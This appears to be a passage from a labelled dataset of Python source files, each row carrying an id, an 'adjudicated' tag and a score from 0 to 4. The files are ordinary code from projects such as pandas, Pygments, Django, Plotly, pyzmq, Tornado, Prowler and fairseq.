    arr = [1370745748 + t for t in range(20)] + [NaT.value]
    idx = DatetimeIndex(arr * 3)
    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))
    assert idx.nunique() == 20
    assert idx.nunique(dropna=False) == 21


def test_index_unique3():
    arr = [
        Timestamp(""2013-06-09 02:42:28"") + timedelta(seconds=t) for t in range(20)
    ] + [NaT]
    idx = DatetimeIndex(arr * 3)
    tm.assert_index_equal(idx.unique(), DatetimeIndex(arr))
    assert idx.nunique() == 20
    assert idx.nunique(dropna=False) == 21


def test_is_unique_monotonic(rand_series_with_duplicate_datetimeindex):
    index = rand_series_with_duplicate_datetimeindex.index
    assert not index.is_unique"
474	adjudicated	1	"# Copyright 2018-present Tellabs, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
"""""" Tellabs vendor-specific OMCI Entities""""""

import inspect
import structlog
import sys

from scapy.fields import ShortField, IntField, ByteField, StrFixedLenField
from voltha.extensions.omci.omci_entities import EntityClassAttribute, \
    AttributeAccess, OmciNullPointer, EntityOperations, EntityClass

log = structlog.get_logger()

# abbreviations
ECA = EntityClassAttribute
AA = AttributeAccess
OP = EntityOperations

#################################################################################
# entity class lookup table from entity_class values
_onu_entity_classes_name_map = dict(
    inspect.getmembers(sys.modules[__name__], lambda o:
    inspect.isclass(o) and issubclass(o, EntityClass) and o is not EntityClass)
)
_onu_custom_entity_classes = [c for c in _onu_entity_classes_name_map.itervalues()]
_onu_custom_entity_id_to_class_map = dict()


def onu_custom_me_entities():
    log.info('onu_custom_me_entities')

    if len(_onu_custom_entity_id_to_class_map) == 0:
        for entity_class in _onu_custom_entity_classes:
            log.info('adding-custom-me', class_id=entity_class.class_id)
            assert entity_class.class_id not in _onu_custom_entity_id_to_class_map, \
                ""Class ID '{}' already exists in the class map"".format(entity_class.class_id)
            _onu_custom_entity_id_to_class_map[entity_class.class_id] = entity_class

    log.info('onu_custom_me_entities', map=_onu_custom_entity_id_to_class_map)
    return _onu_custom_entity_id_to_class_map
"
487	adjudicated	0	"import numpy as np

from pandas import (
    Series,
    Timestamp,
    date_range,
)
import pandas._testing as tm
from pandas.api.types import is_scalar


class TestSeriesSearchSorted:
    def test_searchsorted(self):
        ser = Series([1, 2, 3])

        result = ser.searchsorted(1, side=""left"")
        assert is_scalar(result)
        assert result == 0

        result = ser.searchsorted(1, side=""right"")
        assert is_scalar(result)
        assert result == 1

    def test_searchsorted_numeric_dtypes_scalar(self):
        ser = Series([1, 2, 90, 1000, 3e9])
        res = ser.searchsorted(30)
        assert is_scalar(res)
        assert res == 2

        res = ser.searchsorted([30])
        exp = np.array([2], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)

    def test_searchsorted_numeric_dtypes_vector(self):
        ser = Series([1, 2, 90, 1000, 3e9])
        res = ser.searchsorted([91, 2e6])
        exp = np.array([3, 4], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)

    def test_searchsorted_datetime64_scalar(self):
        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))
        val = Timestamp(""20120102"")
        res = ser.searchsorted(val)
        assert is_scalar(res)
        assert res == 1

    def test_searchsorted_datetime64_scalar_mixed_timezones(self):
        # GH 30086
        ser = Series(date_range(""20120101"", periods=10, freq=""2D"", tz=""UTC""))
        val = Timestamp(""20120102"", tz=""America/New_York"")
        res = ser.searchsorted(val)
        assert is_scalar(res)
        assert res == 1

    def test_searchsorted_datetime64_list(self):
        ser = Series(date_range(""20120101"", periods=10, freq=""2D""))
        vals = [Timestamp(""20120102""), Timestamp(""20120104"")]
        res = ser.searchsorted(vals)
        exp = np.array([1, 2], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)

    def test_searchsorted_sorter(self):
        # GH8490
        ser = Series([3, 1, 2])
        res = ser.searchsorted([0, 3], sorter=np.argsort(ser))
        exp = np.array([0, 2], dtype=np.intp)
        tm.assert_numpy_array_equal(res, exp)"
398	adjudicated	3	"""""""
    pygments.styles.vim
    ~~~~~~~~~~~~~~~~~~~

    A highlighting style for Pygments, inspired by vim.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace, Token


class VimStyle(Style):
    """"""
    Styles somewhat like vim 7.0
    """"""

    background_color = ""#000000""
    highlight_color = ""#222222""

    styles = {
        Token:                     ""#cccccc"",
        Whitespace:                """",
        Comment:                   ""#000080"",
        Comment.Preproc:           """",
        Comment.Special:           ""bold #cd0000"",

        Keyword:                   ""#cdcd00"",
        Keyword.Declaration:       ""#00cd00"",
        Keyword.Namespace:         ""#cd00cd"",
        Keyword.Pseudo:            """",
        Keyword.Type:              ""#00cd00"",

        Operator:                  ""#3399cc"",
        Operator.Word:             ""#cdcd00"",

        Name:                      """",
        Name.Class:                ""#00cdcd"",
        Name.Builtin:              ""#cd00cd"",
        Name.Exception:            ""bold #666699"",
        Name.Variable:             ""#00cdcd"",

        String:                    ""#cd0000"",
        Number:                    ""#cd00cd"",

        Generic.Heading:           ""bold #000080"",
        Generic.Subheading:        ""bold #800080"",
        Generic.Deleted:           ""#cd0000"",
        Generic.Inserted:          ""#00cd00"",
        Generic.Error:             ""#FF0000"",
        Generic.Emph:              ""italic"",
        Generic.Strong:            ""bold"",
        Generic.Prompt:            ""bold #000080"",
        Generic.Output:            ""#888"",
        Generic.Traceback:         ""#04D"",

        Error:                     ""border:#FF0000""
    }"
9	adjudicated	4	"#!/usr/bin/env python3
# Copyright (c) 2011 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""These functions are executed via gyp-flock-tool when using the Makefile
generator.  Used on systems that don't have a built-in flock.""""""

import fcntl
import os
import struct
import subprocess
import sys


def main(args):
    executor = FlockTool()
    executor.Dispatch(args)


class FlockTool:
    """"""This class emulates the 'flock' command.""""""

    def Dispatch(self, args):
        """"""Dispatches a string command to a method.""""""
        if len(args) < 1:
            raise Exception(""Not enough arguments"")

        method = ""Exec%s"" % self._CommandifyName(args[0])
        getattr(self, method)(*args[1:])

    def _CommandifyName(self, name_string):
        """"""Transforms a tool name like copy-info-plist to CopyInfoPlist""""""
        return name_string.title().replace(""-"", """")

    def ExecFlock(self, lockfile, *cmd_list):
        """"""Emulates the most basic behavior of Linux's flock(1).""""""
        # Rely on exception handling to report errors.
        # Note that the stock python on SunOS has a bug
        # where fcntl.flock(fd, LOCK_EX) always fails
        # with EBADF, that's why we use this F_SETLK
        # hack instead.
        fd = os.open(lockfile, os.O_WRONLY | os.O_NOCTTY | os.O_CREAT, 0o666)
        if sys.platform.startswith(""aix""):
            # Python on AIX is compiled with LARGEFILE support, which changes the
            # struct size.
            op = struct.pack(""hhIllqq"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)
        else:
            op = struct.pack(""hhllhhl"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)
        fcntl.fcntl(fd, fcntl.F_SETLK, op)
        return subprocess.call(cmd_list)


if __name__ == ""__main__"":
    sys.exit(main(sys.argv[1:]))"
149	adjudicated	0	"# -*- coding: utf-8 -*-
from django.contrib.admin import FieldListFilter
from django.contrib.admin.utils import prepare_lookup_value
from django.utils.translation import gettext_lazy as _


class NullFieldListFilter(FieldListFilter):
    def __init__(self, field, request, params, model, model_admin, field_path):
        self.lookup_kwarg = '{0}__isnull'.format(field_path)
        super().__init__(field, request, params, model, model_admin, field_path)
        lookup_choices = self.lookups(request, model_admin)
        self.lookup_choices = () if lookup_choices is None else list(lookup_choices)

    def expected_parameters(self):
        return [self.lookup_kwarg]

    def value(self):
        return self.used_parameters.get(self.lookup_kwarg, None)

    def lookups(self, request, model_admin):
        return (
            ('1', _('Yes')),
            ('0', _('No')),
        )

    def choices(self, cl):
        yield {
            'selected': self.value() is None,
            'query_string': cl.get_query_string({}, [self.lookup_kwarg]),
            'display': _('All'),
        }
        for lookup, title in self.lookup_choices:
            yield {
                'selected': self.value() == prepare_lookup_value(self.lookup_kwarg, lookup),
                'query_string': cl.get_query_string({
                    self.lookup_kwarg: lookup,
                }, []),
                'display': title,
            }

    def queryset(self, request, queryset):
        if self.value() is not None:
            kwargs = {self.lookup_kwarg: self.value()}
            return queryset.filter(**kwargs)
        return queryset


class NotNullFieldListFilter(NullFieldListFilter):
    def lookups(self, request, model_admin):
        return (
            ('0', _('Yes')),
            ('1', _('No')),
        )"
58	adjudicated	2	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""scatterpolargl"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
118	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""candlestick.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
108	adjudicated	4	"""""""
Validator for a regular language.
""""""
from typing import Dict

from prompt_toolkit.document import Document
from prompt_toolkit.validation import ValidationError, Validator

from .compiler import _CompiledGrammar

__all__ = [
    ""GrammarValidator"",
]


class GrammarValidator(Validator):
    """"""
    Validator which can be used for validation according to variables in
    the grammar. Each variable can have its own validator.

    :param compiled_grammar: `GrammarCompleter` instance.
    :param validators: `dict` mapping variable names of the grammar to the
                       `Validator` instances to be used for each variable.
    """"""

    def __init__(
        self, compiled_grammar: _CompiledGrammar, validators: Dict[str, Validator]
    ) -> None:

        self.compiled_grammar = compiled_grammar
        self.validators = validators

    def validate(self, document: Document) -> None:
        # Parse input document.
        # We use `match`, not `match_prefix`, because for validation, we want
        # the actual, unambiguous interpretation of the input.
        m = self.compiled_grammar.match(document.text)

        if m:
            for v in m.variables():
                validator = self.validators.get(v.varname)

                if validator:
                    # Unescape text.
                    unwrapped_text = self.compiled_grammar.unescape(v.varname, v.value)

                    # Create a document, for the completions API (text/cursor_position)
                    inner_document = Document(unwrapped_text, len(unwrapped_text))

                    try:
                        validator.validate(inner_document)
                    except ValidationError as e:
                        raise ValidationError(
                            cursor_position=v.start + e.cursor_position,
                            message=e.message,
                        ) from e
        else:
            raise ValidationError(
                cursor_position=len(document.text), message=""Invalid command""
            )"
48	adjudicated	0	"from prowler.lib.check.models import Check, Check_Report_AWS
from prowler.providers.aws.services.opensearch.opensearch_client import (
    opensearch_client,
)


class opensearch_service_domains_cloudwatch_logging_enabled(Check):
    def execute(self):
        findings = []
        for domain in opensearch_client.opensearch_domains:
            report = Check_Report_AWS(self.metadata())
            report.region = domain.region
            report.resource_id = domain.name
            report.resource_arn = domain.arn
            report.status = ""FAIL""
            report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS disabled""
            has_SEARCH_SLOW_LOGS = False
            has_INDEX_SLOW_LOGS = False
            for logging_item in domain.logging:
                if logging_item.name == ""SEARCH_SLOW_LOGS"" and logging_item.enabled:
                    has_SEARCH_SLOW_LOGS = True
                if logging_item.name == ""INDEX_SLOW_LOGS"" and logging_item.enabled:
                    has_INDEX_SLOW_LOGS = True

            if has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:
                report.status = ""PASS""
                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS and INDEX_SLOW_LOGS enabled""
            elif not has_SEARCH_SLOW_LOGS and has_INDEX_SLOW_LOGS:
                report.status = ""FAIL""
                report.status_extended = f""Opensearch domain {domain.name} INDEX_SLOW_LOGS enabled but SEARCH_SLOW_LOGS disabled""
            elif not has_INDEX_SLOW_LOGS and has_SEARCH_SLOW_LOGS:
                report.status = ""FAIL""
                report.status_extended = f""Opensearch domain {domain.name} SEARCH_SLOW_LOGS enabled but INDEX_SLOW_LOGS disabled""

            findings.append(report)

        return findings"
159	adjudicated	3	"""""""Models an on/off device.""""""
from __future__ import annotations
from typing import Any

from .. import ApiSession
from ..info import HomeInfo

from .device import Device
from .const import DeviceType, DeviceTypeId


class OnOffDevice(Device):
    """"""Models an on/off device with a single on/off state and command.""""""

    def __init__(
        self,
        session: ApiSession,
        home: HomeInfo,
        data: dict,
        device_type: DeviceType,
        device_type_id: int
    ) -> None:
        super().__init__(session, home, data, device_type, device_type_id, do_update=False)
        self.is_on: bool = False
        self.update(data)

    def update(self, data: dict[str, Any]):
        """"""Update the radiator from cloud API data.""""""
        super().update(data)
        self.is_on = data[""on_off""] == ""1""

    async def set_onoff_state(self, turn_on: bool):
        """"""Set the onoff state, on (true) or off (false)""""""
        if turn_on == self.is_on:
            return

        query_params = {}
        query_params[""id_device""] = self.id_local
        query_params[""on_off""] = ""1"" if turn_on else ""0""
        query_params[""nv_mode""] = self.device_type_id
        query_params[""gv_mode""] = self.device_type_id

        await self._session.write_query(self.home.home_id, query_params)

        # This is debatable - for some scenarios it is reasonable to
        # update the value in the current object with the assumed
        # change, for others not
        self.is_on = turn_on

class Light(OnOffDevice):
    """"""Models a light.""""""

    def __init__(
        self,
        session: ApiSession,
        home: HomeInfo,
        data: dict
    ) -> None:
        super().__init__(session, home, data, DeviceType.LIGHT, DeviceTypeId.LIGHT)

class Outlet(OnOffDevice):
    """"""Models an outlet.""""""

    def __init__(
        self,
        session: ApiSession,
        home: HomeInfo,
        data: dict
    ) -> None:
        super().__init__(session, home, data, DeviceType.OUTLET, DeviceTypeId.OUTLET)"
19	adjudicated	2	"#!/usr/bin/env python3
#
# Make a DWIN .ico file from a directory of JPEG icon files.
#
#  Copyright (c) 2020 Brent Burton
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.
#----------------------------------------------------------------

import os.path
import argparse
import DWIN_ICO

version = '2.0.7'

#----------------
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Make .ico from JPEG files')
        parser.add_argument('iconDir', type=str, nargs=1,
                            help='name of directory containing icon JPGs')
        parser.add_argument('filename', type=str, nargs=1,
                            help='name of new .ico file to create')
        args = parser.parse_args()

        filename = args.filename[0]
        iconDir = args.iconDir[0]

        if os.path.isfile(filename):
            raise RuntimeError(""ICO file '%s' already exists."" % (filename))

        if not os.path.exists(iconDir):
            raise RuntimeError(""Icon directory '%s' doesn't exist."" % (iconDir))

        print(""Making .ico file '%s' from contents of '%s'"" % (filename, iconDir))
        ico = DWIN_ICO.DWIN_ICO_File()
        ico.createFile(iconDir, filename)

    except Exception as e:
        print('Error: ', e)
"
388	adjudicated	2	"class BaseInstanceLoader:
    """"""
    Base abstract implementation of instance loader.
    """"""

    def __init__(self, resource, dataset=None):
        self.resource = resource
        self.dataset = dataset

    def get_instance(self, row):
        raise NotImplementedError


class ModelInstanceLoader(BaseInstanceLoader):
    """"""
    Instance loader for Django model.

    Lookup for model instance by ``import_id_fields``.
    """"""

    def get_queryset(self):
        return self.resource.get_queryset()

    def get_instance(self, row):
        try:
            params = {}
            for key in self.resource.get_import_id_fields():
                field = self.resource.fields[key]
                params[field.attribute] = field.clean(row)
            if params:
                return self.get_queryset().get(**params)
            else:
                return None
        except self.resource._meta.model.DoesNotExist:
            return None


class CachedInstanceLoader(ModelInstanceLoader):
    """"""
    Loads all possible model instances in dataset avoid hitting database for
    every ``get_instance`` call.

    This instance loader work only when there is one ``import_id_fields``
    field.
    """"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        pk_field_name = self.resource.get_import_id_fields()[0]
        self.pk_field = self.resource.fields[pk_field_name]

        ids = [self.pk_field.clean(row) for row in self.dataset.dict]
        qs = self.get_queryset().filter(**{
            ""%s__in"" % self.pk_field.attribute: ids
            })

        self.all_instances = {
            self.pk_field.get_value(instance): instance
            for instance in qs
        }

    def get_instance(self, row):
        return self.all_instances.get(self.pk_field.clean(row))"
497	adjudicated	3	"""""""miscellaneous zmq_utils wrapping""""""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

from zmq.error import InterruptedSystemCall, _check_rc, _check_version

from ._cffi import ffi
from ._cffi import lib as C


def has(capability):
    """"""Check for zmq capability by name (e.g. 'ipc', 'curve')

    .. versionadded:: libzmq-4.1
    .. versionadded:: 14.1
    """"""
    _check_version((4, 1), 'zmq.has')
    if isinstance(capability, str):
        capability = capability.encode('utf8')
    return bool(C.zmq_has(capability))


def curve_keypair():
    """"""generate a Z85 key pair for use with zmq.CURVE security

    Requires libzmq (â¥ 4.0) to have been built with CURVE support.

    Returns
    -------
    (public, secret) : two bytestrings
        The public and private key pair as 40 byte z85-encoded bytestrings.
    """"""
    _check_version((3, 2), ""curve_keypair"")
    public = ffi.new('char[64]')
    private = ffi.new('char[64]')
    rc = C.zmq_curve_keypair(public, private)
    _check_rc(rc)
    return ffi.buffer(public)[:40], ffi.buffer(private)[:40]


def curve_public(private):
    """"""Compute the public key corresponding to a private key for use
    with zmq.CURVE security

    Requires libzmq (â¥ 4.2) to have been built with CURVE support.

    Parameters
    ----------
    private
        The private key as a 40 byte z85-encoded bytestring
    Returns
    -------
    bytestring
        The public key as a 40 byte z85-encoded bytestring.
    """"""
    if isinstance(private, str):
        private = private.encode('utf8')
    _check_version((4, 2), ""curve_public"")
    public = ffi.new('char[64]')
    rc = C.zmq_curve_public(public, private)
    _check_rc(rc)
    return ffi.buffer(public)[:40]


def _retry_sys_call(f, *args, **kwargs):
    """"""make a call, retrying if interrupted with EINTR""""""
    while True:
        rc = f(*args)
        try:
            _check_rc(rc)
        except InterruptedSystemCall:
            continue
        else:
            break


__all__ = ['has', 'curve_keypair', 'curve_public']"
464	adjudicated	1	"import os

import pytest

import pandas.compat as compat

import pandas._testing as tm


def test_rands():
    r = tm.rands(10)
    assert len(r) == 10


def test_rands_array_1d():
    arr = tm.rands_array(5, size=10)
    assert arr.shape == (10,)
    assert len(arr[0]) == 5


def test_rands_array_2d():
    arr = tm.rands_array(7, size=(10, 10))
    assert arr.shape == (10, 10)
    assert len(arr[1, 1]) == 7


def test_numpy_err_state_is_default():
    expected = {""over"": ""warn"", ""divide"": ""warn"", ""invalid"": ""warn"", ""under"": ""ignore""}
    import numpy as np

    # The error state should be unchanged after that import.
    assert np.geterr() == expected


def test_convert_rows_list_to_csv_str():
    rows_list = [""aaa"", ""bbb"", ""ccc""]
    ret = tm.convert_rows_list_to_csv_str(rows_list)

    if compat.is_platform_windows():
        expected = ""aaa\r\nbbb\r\nccc\r\n""
    else:
        expected = ""aaa\nbbb\nccc\n""

    assert ret == expected


def test_create_temp_directory():
    with tm.ensure_clean_dir() as path:
        assert os.path.exists(path)
        assert os.path.isdir(path)
    assert not os.path.exists(path)


@pytest.mark.parametrize(""strict_data_files"", [True, False])
def test_datapath_missing(datapath):
    with pytest.raises(ValueError, match=""Could not find file""):
        datapath(""not_a_file"")


def test_datapath(datapath):
    args = (""io"", ""data"", ""csv"", ""iris.csv"")

    result = datapath(*args)
    expected = os.path.join(os.path.dirname(os.path.dirname(__file__)), *args)

    assert result == expected


def test_rng_context():
    import numpy as np

    expected0 = 1.764052345967664
    expected1 = 1.6243453636632417

    with tm.RNGContext(0):
        with tm.RNGContext(1):
            assert np.random.randn() == expected1
        assert np.random.randn() == expected0


def test_external_error_raised():
    with tm.external_error_raised(TypeError):
        raise TypeError(""Should not check this error message, so it will pass"")"
435	adjudicated	3	"""""""
    pygments.lexers.sgf
    ~~~~~~~~~~~~~~~~~~~

    Lexer for Smart Game Format (sgf) file format.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Name, Literal, String, Text, Punctuation, Whitespace

__all__ = [""SmartGameFormatLexer""]


class SmartGameFormatLexer(RegexLexer):
    """"""
    Lexer for Smart Game Format (sgf) file format.

    The format is used to store game records of board games for two players
    (mainly Go game).

    .. versionadded:: 2.4
    """"""
    name = 'SmartGameFormat'
    url = 'https://www.red-bean.com/sgf/'
    aliases = ['sgf']
    filenames = ['*.sgf']

    tokens = {
        'root': [
            (r'[():;]+', Punctuation),
            # tokens:
            (r'(A[BW]|AE|AN|AP|AR|AS|[BW]L|BM|[BW]R|[BW]S|[BW]T|CA|CH|CP|CR|'
             r'DD|DM|DO|DT|EL|EV|EX|FF|FG|G[BW]|GC|GM|GN|HA|HO|ID|IP|IT|IY|KM|'
             r'KO|LB|LN|LT|L|MA|MN|M|N|OB|OM|ON|OP|OT|OV|P[BW]|PC|PL|PM|RE|RG|'
             r'RO|RU|SO|SC|SE|SI|SL|SO|SQ|ST|SU|SZ|T[BW]|TC|TE|TM|TR|UC|US|VW|'
             r'V|[BW]|C)',
             Name.Builtin),
            # number:
            (r'(\[)([0-9.]+)(\])',
             bygroups(Punctuation, Literal.Number, Punctuation)),
            # date:
            (r'(\[)([0-9]{4}-[0-9]{2}-[0-9]{2})(\])',
             bygroups(Punctuation, Literal.Date, Punctuation)),
            # point:
            (r'(\[)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation)),
            # double points:
            (r'(\[)([a-z]{2})(:)([a-z]{2})(\])',
             bygroups(Punctuation, String, Punctuation, String, Punctuation)),

            (r'(\[)([\w\s#()+,\-.:?]+)(\])',
             bygroups(Punctuation, String, Punctuation)),
            (r'(\[)(\s.*)(\])',
             bygroups(Punctuation, Whitespace, Punctuation)),
            (r'\s+', Whitespace)
        ],
    }"
401	adjudicated	3	"import hashlib
import hmac
from operator import itemgetter
from typing import Callable, Any, Dict
from urllib.parse import parse_qsl


def check_webapp_signature(token: str, init_data: str) -> bool:
    """"""
    Check incoming WebApp init data signature

    Source: https://core.telegram.org/bots/webapps#validating-data-received-via-the-web-app

    :param token:
    :param init_data:
    :return:
    """"""
    try:
        parsed_data = dict(parse_qsl(init_data))
    except ValueError:
        # Init data is not a valid query string
        return False
    if ""hash"" not in parsed_data:
        # Hash is not present in init data
        return False

    hash_ = parsed_data.pop('hash')
    data_check_string = ""\n"".join(
        f""{k}={v}"" for k, v in sorted(parsed_data.items(), key=itemgetter(0))
    )
    secret_key = hmac.new(
        key=b""WebAppData"", msg=token.encode(), digestmod=hashlib.sha256
    )
    calculated_hash = hmac.new(
        key=secret_key.digest(), msg=data_check_string.encode(), digestmod=hashlib.sha256
    ).hexdigest()
    return calculated_hash == hash_


def parse_init_data(init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:
    """"""
    Parse WebApp init data and return it as dict

    :param init_data:
    :param _loads:
    :return:
    """"""
    result = {}
    for key, value in parse_qsl(init_data):
        if (value.startswith('[') and value.endswith(']')) or (value.startswith('{') and value.endswith('}')):
            value = _loads(value)
        result[key] = value
    return result


def safe_parse_webapp_init_data(token: str, init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:
    """"""
    Validate WebApp init data and return it as dict

    :param token:
    :param init_data:
    :param _loads:
    :return:
    """"""
    if check_webapp_signature(token, init_data):
        return parse_init_data(init_data, _loads)
    raise ValueError(""Invalid init data signature"")"
450	adjudicated	3	"# flake8: noqa
import subprocess
import sys
import unittest

_import_everything = b""""""
# The event loop is not fork-safe, and it's easy to initialize an asyncio.Future
# at startup, which in turn creates the default event loop and prevents forking.
# Explicitly disallow the default event loop so that an error will be raised
# if something tries to touch it.
import asyncio
asyncio.set_event_loop(None)

import tornado.auth
import tornado.autoreload
import tornado.concurrent
import tornado.escape
import tornado.gen
import tornado.http1connection
import tornado.httpclient
import tornado.httpserver
import tornado.httputil
import tornado.ioloop
import tornado.iostream
import tornado.locale
import tornado.log
import tornado.netutil
import tornado.options
import tornado.process
import tornado.simple_httpclient
import tornado.tcpserver
import tornado.tcpclient
import tornado.template
import tornado.testing
import tornado.util
import tornado.web
import tornado.websocket
import tornado.wsgi

try:
    import pycurl
except ImportError:
    pass
else:
    import tornado.curl_httpclient
""""""


class ImportTest(unittest.TestCase):
    def test_import_everything(self):
        # Test that all Tornado modules can be imported without side effects,
        # specifically without initializing the default asyncio event loop.
        # Since we can't tell which modules may have already beein imported
        # in our process, do it in a subprocess for a clean slate.
        proc = subprocess.Popen([sys.executable], stdin=subprocess.PIPE)
        proc.communicate(_import_everything)
        self.assertEqual(proc.returncode, 0)

    def test_import_aliases(self):
        # Ensure we don't delete formerly-documented aliases accidentally.
        import tornado.ioloop
        import tornado.gen
        import tornado.util
        import asyncio

        self.assertIs(tornado.ioloop.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.gen.TimeoutError, tornado.util.TimeoutError)
        self.assertIs(tornado.util.TimeoutError, asyncio.TimeoutError)"
510	adjudicated	1	"import argparse
from typing import Tuple


def get_next_version(release_type) -> Tuple[Tuple[int, int, int], str, str]:
    current_ver = find_version(""fairseq/version.txt"")
    version_list = [int(x) for x in current_ver.strip(""'"").split(""."")]
    major, minor, patch = version_list[0], version_list[1], version_list[2]
    if release_type == ""patch"":
        patch += 1
    elif release_type == ""minor"":
        minor += 1
        patch = 0
    elif release_type == ""major"":
        major += 1
        minor = patch = 0
    else:
        raise ValueError(
            ""Incorrect release type specified. Acceptable types are major, minor and patch.""
        )

    new_version_tuple = (major, minor, patch)
    new_version_str = ""."".join([str(x) for x in new_version_tuple])
    new_tag_str = ""v"" + new_version_str
    return new_version_tuple, new_version_str, new_tag_str


def find_version(version_file_path) -> str:
    with open(version_file_path) as f:
        version = f.read().strip()
        return version


def update_version(new_version_str) -> None:
    """"""
    given the current version, update the version to the
    next version depending on the type of release.
    """"""

    with open(""fairseq/version.txt"", ""w"") as writer:
        writer.write(new_version_str)


def main(args):
    if args.release_type in [""major"", ""minor"", ""patch""]:
        new_version_tuple, new_version, new_tag = get_next_version(args.release_type)
    else:
        raise ValueError(""Incorrect release type specified"")

    if args.update_version:
        update_version(new_version)

    print(new_version, new_tag)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(description=""Versioning utils"")
    parser.add_argument(
        ""--release-type"",
        type=str,
        required=True,
        help=""type of release = major/minor/patch"",
    )
    parser.add_argument(
        ""--update-version"",
        action=""store_true"",
        required=False,
        help=""updates the version in fairseq/version.txt"",
    )

    args = parser.parse_args()
    main(args)"
470	adjudicated	1	"from selenium.webdriver.common.by import By


class BasePageLocators():
    LOGIN_LINK = (By.CSS_SELECTOR, ""#login_link"")
    LOGIN_LINK_INVALID = (By.CSS_SELECTOR, ""#login_link_inc"")  # for checking the correct error message


class MainPageLocators():
    pass


class LoginPageLocators():
    LOGIN_EMAIL = (By.CSS_SELECTOR, ""[name='login-username']"")
    LOGIN_PASSWORD = (By.CSS_SELECTOR, ""[name='login-password']"")
    FORGOT_PASSWORD_BUTTON = (By.CSS_SELECTOR, 'a[href*=""password-reset""]')
    LOGIN_BUTTON = (By.CSS_SELECTOR, ""[name='login_submit']"")
    SIGN_UP_EMAIL = (By.CSS_SELECTOR, ""[name='registration-email']"")
    SIGN_UP_PASSWORD = (By.CSS_SELECTOR, ""[name='registration-password1']"")
    SIGN_UP_PASSWORD_REPETITION = (By.CSS_SELECTOR, ""[name='registration-password2']"")
